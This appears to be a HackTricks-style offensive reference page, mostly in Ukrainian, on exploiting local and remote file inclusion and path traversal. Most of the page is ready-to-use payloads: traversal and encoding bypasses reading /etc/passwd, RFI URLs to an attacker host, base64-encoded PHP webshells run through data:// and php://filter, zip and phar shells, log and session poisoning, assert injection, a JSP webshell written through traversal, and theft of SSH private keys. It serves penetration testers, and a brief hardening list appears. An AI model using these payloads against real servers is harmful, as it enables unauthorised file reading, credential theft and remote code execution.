# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** file завантажується з віддаленого server (Найкраще: Ви можете написати code і server його виконає). У php це за замовчуванням **відключено** (**allow_url_include**).\
**Local File Inclusion (LFI):** server завантажує local file.

Вразливість виникає, коли користувач якимось чином може контролювати file, який server збирається завантажити.

Уразливі **PHP functions**: require, require_once, include, include_once

Корисний інструмент для експлуатації цієї вразливості: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Змішавши кілька \*nix LFI списків і додавши більше шляхів, я створив цей:**

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Спробуйте також замінити `/` на `\`\
Спробуйте також додати `../../../../../`

Список, який використовує кілька технік для пошуку файлу /etc/password (щоб перевірити, чи існує вразливість), можна знайти [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Об'єднання різних wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Спробуйте також замінити `/` на `\`\
Спробуйте також видалити `C:/` і додати `../../../../../`

Список, який використовує кілька технік для пошуку файлу /boot.ini (щоб перевірити, чи існує вразливість), можна знайти [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Перевірте LFI список linux.

## Основи LFI та обхідні методи

Усі приклади стосуються Local File Inclusion, але також можуть застосовуватися до Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences, обрізані нерекурсивно
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass додавання додаткових символів у кінець наданого рядка (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Це **виправлено з PHP 5.4**

### **Кодування**

Ви можете використовувати нестандартні кодування, такі як double URL encode (та інші):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### З існуючої папки

Можливо, back-end перевіряє шлях до папки:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Дослідження File System Directories on a Server

File system of a server можна рекурсивно досліджувати, щоб виявляти directories, а не лише files, застосовуючи певні techniques. Цей процес передбачає визначення directory depth та перевірку існування конкретних folders. Нижче наведено детальний метод для цього:

1. **Визначте Directory Depth:** Визначте глибину вашої поточної directory, успішно отримавши файл `/etc/passwd` (застосовується, якщо server — Linux-based). Приклад URL може бути структурований таким чином, вказуючи depth 3:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Перевірте папки:** Додайте назву підозрілої папки (наприклад, `private`) до URL, потім поверніться до `/etc/passwd`. Додатковий рівень директорії вимагає збільшення глибини на одиницю:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Інтерпретація результатів:** Відповідь сервера вказує, чи існує папка:
- **Error / No Output:** Папка `private` ймовірно не існує в зазначеному місці.
- **Contents of `/etc/passwd`:** Наявність папки `private` підтверджено.
4. **Рекурсивне дослідження:** Виявлені папки можна додатково перевіряти на наявність підкаталогів або файлів, використовуючи той самий прийом або традиційні методи Local File Inclusion (LFI).

Для дослідження каталогів у різних місцях файлової системи відповідно відкоригуйте payload. Наприклад, щоб перевірити, чи містить `/var/www/` каталог `private` (припускаючи, що поточний каталог знаходиться на глибині 3), використовуйте:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation є методом, який застосовується для маніпуляції файловими шляхами в веб‑додатках. Його часто використовують для доступу до обмежених файлів, обходячи певні заходи безпеки, які додають додаткові символи в кінець шляхів до файлів. Мета — створити шлях до файлу, який після змін, внесених заходом безпеки, все ще вказуватиме на потрібний файл.

У PHP різні представлення шляху до файлу можуть вважатися еквівалентними через особливості файлової системи. Наприклад:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` всі трактуються як один і той самий шлях.
- Коли останні 6 символів — `passwd`, додавання `/` (тобто `passwd/`) не змінює цільовий файл.
- Аналогічно, якщо до шляху додається `.php` (наприклад `shellcode.php`), додавання `/.` у кінці не змінить файл, до якого здійснюється доступ.

Наведені приклади показують, як використовувати path truncation для доступу до `/etc/passwd`, який часто стає мішенню через чутливий вміст (інформація про облікові записи користувачів):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
У цих сценаріях кількість traversals, що потрібні, може становити близько 2027, але це число може змінюватися залежно від конфігурації сервера.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) у поєднанні з додатковими dot segments і символами можуть використовуватися для навігації файловою системою, фактично ігноруючи додані сервером рядки.
- **Determining the Required Number of Traversals**: За методом спроб і помилок можна знайти точну кількість `../` послідовностей, щоб дістатися до кореневого каталогу, а потім до `/etc/passwd`, забезпечивши нейтралізацію будь‑яких доданих рядків (наприклад, `.php`), але збереження бажаного шляху (`/etc/passwd`).
- **Starting with a Fake Directory**: Загальноприйнята практика — починати шлях з неіснуючого каталогу (наприклад, `a/`). Ця техніка використовується як запобіжний захід або щоб виконати вимоги логіки розбору шляху сервером.

При застосуванні path truncation techniques важливо розуміти поведінку парсера шляхів сервера та структуру файлової системи. Кожен сценарій може вимагати іншого підходу, і часто необхідне тестування, щоб знайти найефективніший метод.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

У php це за замовчуванням вимкнено, оскільки **`allow_url_include`** — **Off.** Потрібно, щоб він був **On**, щоб це працювало, і в такому випадку ви могли б включити PHP файл зі свого сервера та отримати RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Якщо з якоїсь причини **`allow_url_include`** **увімкнено**, але PHP **фільтрує** доступ до зовнішніх веб-сторінок, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), можна, наприклад, використати data-протокол з base64, щоб декодувати b64 PHP-код і отримати RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> У попередньому коді фінальний `+.txt` було додано, тому що зловмиснику потрібен був рядок, який закінчувався на `.txt`, тож рядок закінчується ним, і після b64 декодування ця частина поверне лише сміття, а реальний PHP-код буде включено (і, отже, виконано).

Ще один приклад **без використання протоколу `php://`**:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python кореневий елемент

У python у коді на кшталт цього:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Якщо користувач передає **абсолютний шлях** до **`file_name`**, **попередній шлях просто видаляється**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Це очікувана поведінка згідно з [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Якщо компонент є абсолютним шляхом, усі попередні компоненти відкидаються, і об’єднання продовжується від компонента з абсолютним шляхом.

## Java: перелік директорій

Здається, якщо у вас є Path Traversal у Java і ви **запитуєте директорію** замість файлу, повертається **перелік вмісту директорії**. Це не відбуватиметься в інших мовах (наскільки мені відомо).

## Топ 25 параметрів

Ось список топ-25 параметрів, які можуть бути вразливі до local file inclusion (LFI) (з [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI за допомогою PHP wrappers & протоколів

### php://filter

Фільтри PHP дозволяють виконувати базові **операції модифікації над даними** перед тим, як вони будуть прочитані або записані. Існує 5 категорій фільтрів:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Видаляє теги з даних (все, що знаходиться між символами "<" та ">" )
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Перетворює в іншу кодування (`convert.iconv.<input_enc>.<output_enc>`). Щоб отримати **список усіх підтримуваних кодувань**, виконайте в консолі: `iconv -l`

> [!WARNING]
> Зловживаючи фільтром конверсії `convert.iconv.*`, ви можете **генерувати довільний текст**, що може бути корисним для запису довільного тексту або змусити функцію типу include обробляти довільний текст. Для додаткової інформації перегляньте [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Стискає вміст (корисно при ексфільтрації великої кількості інформації)
- `zlib.inflate`: Розпаковує дані
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Застаріле
- `mdecrypt.*` : Застаріле
- Other Filters
- Запустивши в PHP `var_dump(stream_get_filters());`, ви можете знайти кілька **неочікуваних фільтрів**:
- `consumed`
- `dechunk`: скасовує HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Частина "php://filter" нечутлива до регістру

### Використання php filters як oracle для читання довільних файлів

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) запропонована техніка для читання локального файлу без отримання виводу від сервера. Ця техніка базується на **boolean exfiltration of the file (char by char) using php filters** як oracle. Це тому, що php filters можна використати, щоб зробити текст достатньо великим, щоб php кинув виняток.

В оригінальному дописі можна знайти детальне пояснення техніки, але тут — коротке резюме:

- Використати кодек **`UCS-4LE`** щоб залишити провідний символ тексту на початку і змусити розмір рядка зростати експоненційно.
- Це буде використано для генерації **text so big when the initial letter is guessed correctly**, який, якщо початкова літера вгадана правильно, буде настільки великий, що php спричинить **помилку**.
- Фільтр **dechunk** **видалить усе, якщо перший символ не є шістнадцятковим**, тому можна дізнатися, чи перший символ є hex.
- Це, у поєднанні з попереднім (та іншими фільтрами залежно від вгаданої літери), дозволить вгадувати літеру на початку тексту, спостерігаючи, коли достатньо трансформацій зроблять її не шістнадцятковим символом. Тому що, якщо це hex, dechunk не видалить її і початкова «бомба» спричинить php помилку.
- Кодек **convert.iconv.UNICODE.CP930** перетворює кожну літеру на наступну (тому після цього кодека: a -> b). Це дозволяє виявити, чи перша літера — наприклад, `a`, бо якщо застосувати 6 разів цей кодек: a->b->c->d->e->f->g, літера перестає бути шістнадцятковим символом, отже dechunk не видаляє її і php помилка спрацьовує через множення з початковою «бомбою».
- Використовуючи інші трансформації, такі як **rot13** на початку, можна leak інші символи, наприклад n, o, p, q, r (і інші кодеки можна використати, щоб перемістити інші літери в hex-діапазон).
- Коли початковий символ — число, потрібно закодувати його в base64 і leak перші 2 літери, щоб leak число.
- Остаткова проблема — зрозуміти **how to leak more than the initial letter**. Використовуючи фільтри порядку пам'яті, такі як **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**, можливо змінити порядок символів і отримати на першій позиції інші літери тексту.
- І щоб мати змогу отримати **further data**, ідея полягає в тому, щоб **generate 2 bytes of junk data at the beginning** за допомогою **convert.iconv.UTF16.UTF16**, застосувати **UCS-4LE**, щоб це **pivot with the next 2 bytes**, і **delete the data until the junk data** (це видалить перші 2 байти початкового тексту). Продовжуйте робити це, поки не дійдете до потрібного біта для leak.

У дописі також був leaked інструмент для автоматизації: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Ви також можете використовувати **php://stdin, php://stdout and php://stderr** для доступу до **file descriptors 0, 1 and 2** відповідно (не впевнений, як це може бути корисним у атаці)

### zip:// and rar://

Завантажте Zip або Rar файл з PHPShell всередині та отримайте до нього доступ.\
Щоб мати змогу зловживати rar protocol, він **потребує спеціальної активації**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Зверніть увагу, що цей протокол обмежується налаштуваннями php **`allow_url_open`** та **`allow_url_include`**

### expect://

Expect має бути активовано. Ви можете виконувати код за допомогою цього:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Вкажіть свій payload у POST параметрах:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Файл `.phar` може бути використаний для виконання PHP-коду, коли веб‑додаток використовує функції, такі як `include`, для завантаження файлів. Наведений нижче фрагмент PHP-коду демонструє створення файлу `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Щоб скомпілювати файл `.phar`, слід виконати наступну команду:
```bash
php --define phar.readonly=0 create_path.php
```
Після виконання буде створено файл з ім'ям `test.phar`, який потенційно може бути використаний для експлуатації вразливостей Local File Inclusion (LFI).

Якщо LFI лише читає файл без виконання PHP-коду всередині — наприклад через функції `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` або `filesize()` — можна спробувати експлуатувати вразливість десеріалізації. Ця вразливість пов'язана з читанням файлів з використанням протоколу `phar`.

Для детального розуміння експлуатації вразливостей десеріалізації у контексті файлів `.phar` зверніться до документа, що наведений нижче:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Було можливо зловживати **будь-яким довільним читанням файлу з PHP, яке підтримує php filters**, щоб отримати RCE. Детальний опис можна [**знайти в цьому дописі**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1).\
Дуже коротке резюме: **3 byte overflow** в heap PHP було використано, щоб **змінити ланцюг вільних чанків** певного розміру, щоб мати можливість **записати що завгодно в будь-яку адресу**, тому було додано хук для виклику **`system`**.\
Було можливо алоціювати чанки певних розмірів, зловживаючи додатковими php filters.

### More protocols

Перегляньте більше можливих[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Запис у пам'ять або тимчасовий файл (не впевнений, як це може бути корисно в атаці file inclusion)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Доступ до локальної файлової системи
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Доступ до HTTP(s) URL-ів
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Доступ до FTP(s) URL-ів
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Потоки стиснення
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Пошук імен шляхів, що відповідають шаблону (не повертає нічого друкованого, тому не дуже корисно тут)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Аудіопотоки (не корисно для читання довільних файлів)

## LFI via PHP's 'assert'

Ризики Local File Inclusion (LFI) в PHP особливо високі при роботі з функцією 'assert', яка може виконувати код, що міститься в рядках. Це особливо проблематично, якщо ввод, що містить символи обходу директорій, як-от "..", перевіряється, але не належним чином очищується.

Наприклад, PHP-код може бути спроєктований для запобігання обходу директорій ось так:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Хоча це має на меті запобігти traversal, воно ненавмисно створює вектор для code injection. Щоб експлуатувати це і прочитати вміст файлу, attacker може використати:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Аналогічно, для виконання довільних системних команд можна використати:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ця техніка актуальна у випадках, коли ви **контролюєте** **шлях до файлу**, переданий **PHP function**, яка буде **доступатися до файлу**, але ви не побачите вміст файлу (наприклад простий виклик **`file()`**), оскільки вміст не відображається.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

As sumary, the technique is using the **"UCS-4LE" encoding** to make the content of a file so **big** that the **PHP function opening** the file will trigger an **error**.

Then, in order to leak the first char the filter **`dechunk`** is used along with other such as **base64** or **rot13** and finally the filters **convert.iconv.UCS-4.UCS-4LE** and **convert.iconv.UTF16.UTF-16BE** are used to **place other chars at the beggining and leak them**.

**Функції, що можуть бути вразливими**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

За технічними деталями див. згаданий пост!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

When server-side code that ingests/uploads files builds the destination path using user-controlled data (e.g., a filename or URL) without canonicalising and validating it, `..` segments and absolute paths can escape the intended directory and cause an arbitrary file write. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Типовий сценарій експлуатації:
- Виявити a write primitive в endpoint або background worker, який приймає a path/filename і записує вміст на диск (наприклад, message-driven ingestion, XML/JSON command handlers, ZIP extractors тощо).
- Визначити web-exposed директорії. Поширені приклади:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Сформувати traversal path, який виходить за межі наміченої директорії для збереження в webroot, і включити туди вміст вашого webshell.
- Перейдіть до розміщеного payload і виконайте команди.

Примітки:
- Сервіс, що виконує запис, може слухати на non-HTTP порту (наприклад, a JMF XML listener на TCP 4004). Основний веб-портал (інший порт) згодом обслужить ваш payload.
- На Java-стеках такі записи файлів часто реалізуються простим конкатенуванням `File`/`Paths`. Відсутність канонізації/allow-listing — основний недолік.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Заходи жорсткого захисту, що нейтралізують цей клас помилок:
- Розвʼяжіть до канонічного шляху і забезпечте, щоб він був нащадком allow-listed base directory.
- Відхиляйте будь-який шлях, що містить `..`, absolute roots, або drive letters; віддавайте перевагу згенерованим іменам файлів.
- Запускайте записувач від імені низькоправового (low-privileged) облікового запису та розділяйте директорії для запису й served roots.

## Remote File Inclusion

Пояснювалося раніше, [**перейдіть за цим посиланням**](#remote-file-inclusion).

### Via Apache/Nginx log file

Якщо сервер Apache або Nginx **вразливий до LFI** всередині функції include, ви можете спробувати отримати доступ до **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, записати в **user agent** або в **GET parameter** php-оболонку типу **`<?php system($_GET['c']); ?>`** і включити цей файл

> [!WARNING]
> Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Also, make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.

Це також можна зробити в інших логах, але **будьте обережні,** код всередині логів може бути URL encoded і це може зруйнувати Shell. Заголовок **authorisation "basic"** містить "user:password" у Base64 і декодується всередині логів. PHPShell можна вставити всередину цього заголовка.\

Інші можливі шляхи до логів:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Через Email

**Надішліть лист** на внутрішній акаунт (user@localhost), що містить ваш PHP payload, наприклад `<?php echo system($_REQUEST["cmd"]); ?>` і спробуйте включити його в пошту користувача шляхом, наприклад **`/var/mail/<USERNAME>`** або **`/var/spool/mail/<USERNAME>`**

### Через /proc/*/fd/*

1. Завантажте багато shells (наприклад: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), де $PID = PID процесу (можна brute forced), а $FD — дескриптор файлу (також можна brute forced)

### Через /proc/self/environ

Як і з лог-файлом, надішліть payload в User-Agent — він відобразиться у файлі /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Через upload

Якщо ви можете upload файл, просто inject shell payload у нього (наприклад: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Щоб файл залишався читабельним, найкраще інжектувати в метадані зображень/doc/pdf

### Через завантаження ZIP файлу

Завантажте ZIP файл, що містить стиснену PHP shell, і отримайте доступ:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Через PHP sessions

Перевірте, чи сайт використовує PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
У PHP ці сесії зберігаються у _/var/lib/php5/sess\\_\[PHPSESSID]\_ файлах
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Встановіть cookie як `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Використайте LFI, щоб включити файл сесії PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Через ssh

Якщо ssh активний, перевірте, який користувач використовується (/proc/self/status & /etc/passwd) і спробуйте отримати доступ до **\<HOME>/.ssh/id_rsa**

### **Через** **vsftpd** _**logs**_

Логи для FTP сервера vsftpd знаходяться за адресою _**/var/log/vsftpd.log**_. У випадку, коли існує Local File Inclusion (LFI) вразливість і можливий доступ до відкритого vsftpd сервера, можна розглянути такі кроки:

1. Впровадьте PHP payload у username field під час login process.
2. Після ін'єкції використайте LFI, щоб витягнути server logs з _**/var/log/vsftpd.log**_.

### Через php base64 filter (using base64)

Як показано в [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter просто ігнорує Non-base64. Ви можете використати це для обходу перевірки розширення файлу: якщо ви подасте base64, який закінчується на ".php", він просто ігноруватиме "." і додасть "php" до base64. Ось приклад payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Через php filters (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) пояснює, що ви можете використовувати **php filters to generate arbitrary content** як вивід. Це, по суті, означає, що ви можете **generate arbitrary php code** для include **without needing to write** його у файл.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Через segmentation fault

**Upload** файл, який буде збережений як **temporary** у `/tmp`, потім в **the same request,** спровокуйте **segmentation fault**, після чого **the temporary file won't be deleted** і ви зможете його знайти.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Через Nginx temp file storage

Якщо ви знайшли **Local File Inclusion** і **Nginx** працює перед PHP, ви можете отримати RCE за допомогою наступної техніки:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Через PHP_SESSION_UPLOAD_PROGRESS

Якщо ви знайшли **Local File Inclusion**, навіть якщо у вас **don't have a session** і `session.auto_start` встановлено в `Off`. Якщо ви надасте **`PHP_SESSION_UPLOAD_PROGRESS`** у **multipart POST** даних, PHP **enable the session for you**. Це можна використати для отримання RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Через temp file uploads in Windows

Якщо ви знайшли **Local File Inclusion** і сервер працює на **Windows**, ви можете отримати RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Через `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), скрипт `/usr/local/lib/phppearcmd.php` існує за замовчуванням у php docker образах. Крім того, можливо передавати аргументи скрипту через URL, оскільки зазначено, що якщо URL-параметр не має `=`, він повинен використовуватися як аргумент. Див. також [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) і [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Нижче показано, як зловживати CRLF vuln для отримання RCE (з [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
